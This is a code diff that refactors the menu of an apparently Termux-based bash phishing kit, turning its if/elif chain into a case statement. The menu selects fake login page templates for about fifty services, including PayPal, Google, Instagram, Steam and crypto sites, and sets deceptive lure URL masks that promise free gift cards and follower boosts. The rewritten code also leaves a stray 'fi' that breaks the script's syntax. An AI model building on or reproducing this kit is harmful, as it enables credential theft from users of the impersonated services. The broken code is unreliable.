@@ -172,240 +172,242 @@ printf "${lightGreen}[${boldLightGray}99${lightGreen}]${reset}${red} Custom ${re
 printf "${lightGreen}[${boldLightGray}00${lightGreen}]${reset}${red} Exit${reset}           ${lightGreen}[${boldLightGray}F${lightGreen}]${reset}${red} Follow me one Github${reset}\n"
 read -p $' ${red}[${boldLightGray}~${red}]${reset}${lightGreen} Select an option: ${reset}${cyan}' menu_option
 
-
-if [[ $menu_option == 1 || $menu_option == 01 ]]; then
-server="instagram"
-start1
-
-elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
-server="facebook"
-start1
-
-elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
-server="snapchat"
-start1
-
-elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
-server="twitter"
-mask='unlimited-onedrive-space-for free'
-start1
-
-elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
-server="github"
-mask='get-followers-one-github'
-start1
-
-elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
-server="google"
-start1
-
-elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
-server="spotify"
-start1
-
-elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
-server="netflix"
-mask='get-blue-badge-on-twitter-free'
-start1
-
-elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
-server="paypal"
-start1
-
-elif [[ $menu_option == 10 ]]; then
-server="origin"
-start1
-
-elif [[ $menu_option == 11 ]]; then
-server="steam"
-mask='steam-500-usd-gift-card-free'
-start1
-
-elif [[ $menu_option == 12 ]]; then
-server="yahoo"
-start1
-
-elif [[ $menu_option == 13 ]]; then
-server="linkedin"
-start1
-
-elif [[ $menu_option == 14 ]]; then
-server="protonmail"
-start1
-
-elif [[ $menu_option == 15 ]]; then
-server="wordpress"
-start1
-
-elif [[ $menu_option == 16 ]]; then
-server="microsoft"
-start1
-
-elif [[ $menu_option == 17 ]]; then
-server="youtube"
-start1
-
-elif [[ $menu_option == 18 ]]; then
-server="ebay"
-start1
-
-elif [[ $menu_option == 19 ]]; then
-lol
-
-elif [[ $menu_option == 20 ]]; then
-server="pinterest"
-start1
-
-elif [[ $menu_option == 21 ]]; then
-server="cryptocurrency"
-start1
-
-elif [[ $menu_option == 22 ]]; then
-server="verzion"
-start1
-
-elif [[ $menu_option == 23 ]]; then
-server="dropbox"
-start1
-
-elif [[ $menu_option == 24 ]]; then
-server="adobe"
-start1
-
-elif [[ $menu_option == 25 ]]; then
-server="shopfy"
-start1
-
-elif [[ $menu_option == 26 ]]; then
-server="messenger"
-start1
-
-elif [[ $menu_option == 27 ]]; then
-server="gitlab"
-start1
-
-elif [[ $menu_option == 28 ]]; then
-server="twitch"
-start1
-
-elif [[ $menu_option == 29 ]]; then
-server="myspace"
-start1
-
-elif [[ $menu_option == 30 ]]; then
-server="badoo"
-start1
-
-elif [[ $menu_option == 31 ]]; then
-server="vk"
-start1
-
-elif [[ $menu_option == 32 ]]; then
-server="yandex"
-start1
-
-elif [[ $menu_option == 33 ]]; then
-server="devianart"
-start1
-
-elif [[ $menu_option == 34 ]]; then
-server="stackoverflow"
-start1
-
-elif [[ $menu_option == 35 ]]; then
-server="gmail"
-start1
-
-elif [[ $menu_option == 36 ]]; then
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 2 
-menu
-
-
-elif [[ $menu_option == 37 ]]; then
-server="whatsapp"
-start1
-
-elif [[ $menu_option == 38 ]]; then
-server="starbucks"
-start1
-
-elif [[ $menu_option == 39 ]]; then
-server="firmware"
-start1
-
-elif [[ $menu_option == 40 ]]; then
-server="gopro"
-start1
-
-elif [[ $menu_option == 41 ]]; then
-server="apple"
-start1
-
-elif [[ $menu_option == 42 ]]; then
-server="bitcoin"
-start1
-
-elif [[ $menu_option == 43 ]]; then
-server="ytsubs"
-start1
-
-elif [[ $menu_option == 44 ]]; then
-microsoft_ofice
-
-
-elif [[ $menu_option == 45 ]]; then
-server="playstation"
-mask='playstation-500-usd-gift-card-free'
-start1
-
-elif [[ $menu_option == 46 ]]; then
-server="Amazon"
-start1
-
-elif [[ $menu_option == 47 ]]; then
-server="yahoo_web"
-start1
-
-elif [[ $menu_option == 48 ]]; then
-server="pornhub"
-start1
-
-elif [[ $menu_option == 49 ]]; then
-server="xvideos"
-start1
-
-elif [[ $menu_option == 50 ]]; then
-games
-
-elif [[ $menu_option == 51 ]]; then
-operadoras
-
-elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
-sleep 1
-printf "\e[0m\n"
-printf "\e[0m\n"
-exit 1
-
-elif [[ $menu_option == 99 ]]; then
-server="create"
-createpage
-start1
-
-elif [[ $menu_option == Y ]]; then
-banner
-am start -a android.intent.action.VIEW https://youtube.com/channel/UCxTE4c-xqpAqayme5ps560A
-
-elif [[ $menu_option == T ]]; then 
-banner
-am start -a android.intent.action.VIEW https://t.me/Ch33chSec
-
-elif [[ $menu_option == F ]]; then
-banner
-am start -a android.intent.action.VIEW https://github.com/grenoxx
-
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+case $menu_option in
+    1|01)
+        server="instagram"
+        start1
+        ;;
+    2|02)
+        server="facebook"
+        start1
+        ;;
+    3|03)
+        server="snapchat"
+        start1
+        ;;
+    4|04)
+        server="twitter"
+        mask='unlimited-onedrive-space-for free'
+        start1
+        ;;
+    5|05)
+        server="github"
+        mask='get-followers-one-github'
+        start1
+        ;;
+    6|06)
+        server="google"
+        start1
+        ;;
+    7|07)
+        server="spotify"
+        start1
+        ;;
+    8|08)
+        server="netflix"
+        mask='get-blue-badge-on-twitter-free'
+        start1
+        ;;
+    9|09)
+        server="paypal"
+        start1
+        ;;
+    10)
+        server="origin"
+        start1
+        ;;
+    11)
+        server="steam"
+        mask='steam-500-usd-gift-card-free'
+        start1
+        ;;
+    12)
+        server="yahoo"
+        start1
+        ;;
+    13)
+        server="linkedin"
+        start1
+        ;;
+    14)
+        server="protonmail"
+        start1
+        ;;
+    15)
+        server="wordpress"
+        start1
+        ;;
+    16)
+        server="microsoft"
+        start1
+        ;;
+    17)
+        server="youtube"
+        start1
+        ;;
+    18)
+        server="ebay"
+        start1
+        ;;
+    19)
+        lol
+        ;;
+    20)
+        server="pinterest"
+        start1
+        ;;
+    21)
+        server="cryptocurrency"
+        start1
+        ;;
+    22)
+        server="verzion"
+        start1
+        ;;
+    23)
+        server="dropbox"
+        start1
+        ;;
+    24)
+        server="adobe"
+        start1
+        ;;
+    25)
+        server="shopfy"
+        start1
+        ;;
+    26)
+        server="messenger"
+        start1
+        ;;
+    27)
+        server="gitlab"
+        start1
+        ;;
+    28)
+        server="twitch"
+        start1
+        ;;
+    29)
+        server="myspace"
+        start1
+        ;;
+    30)
+        server="badoo"
+        start1
+        ;;
+    31)
+        server="vk"
+        start1
+        ;;
+    32)
+        server="yandex"
+        start1
+        ;;
+    33)
+        server="devianart"
+        start1
+        ;;
+    34)
+        server="stackoverflow"
+        start1
+        ;;
+    35)
+        server="gmail"
+        start1
+        ;;
+    36)
+        printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
+        sleep 2 
+        menu
+        ;;
+    37)
+        server="whatsapp"
+        start1
+        ;;
+    38)
+        server="starbucks"
+        start1
+        ;;
+    39)
+        server="firmware"
+        start1
+        ;;
+    40)
+        server="gopro"
+        start1
+        ;;
+    41)
+        server="apple"
+        start1
+        ;;
+    42)
+        server="bitcoin"
+        start1
+        ;;
+    43)
+        server="ytsubs"
+        start1
+        ;;
+    44)
+        microsoft_ofice
+        ;;
+    45)
+        server="playstation"
+        mask='playstation-500-usd-gift-card-free'
+        start1
+        ;;
+    46)
+        server="Amazon"
+        start1
+        ;;
+    47)
+        server="yahoo_web"
+        start1
+        ;;
+    48)
+        server="pornhub"
+        start1
+        ;;
+    49)
+        server="xvideos"
+        start1
+        ;;
+    50)
+        games
+        ;;
+    51)
+        operadoras
+        ;;
+    0|00)
+        sleep 1
+        printf "\e[0m\n"
+        printf "\e[0m\n"
+        exit 1
+        ;;
+    99)
+        server="create"
+        createpage
+        start1
+        ;;
+    Y)
+        banner
+        am start -a android.intent.action.VIEW https://youtube.com/channel/UCxTE4c-xqpAqayme5ps560A
+        ;;
+    T)
+        banner
+        am start -a android.intent.action.VIEW https://t.me/Ch33chSec
+        ;;
+    F)
+        banner
+        am start -a android.intent.action.VIEW https://github.com/BrunoCiccarino
+        ;;
+    *)
+        printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
+        sleep 2 
+        menu
+        ;;
+esac
 menu
 fi
 }
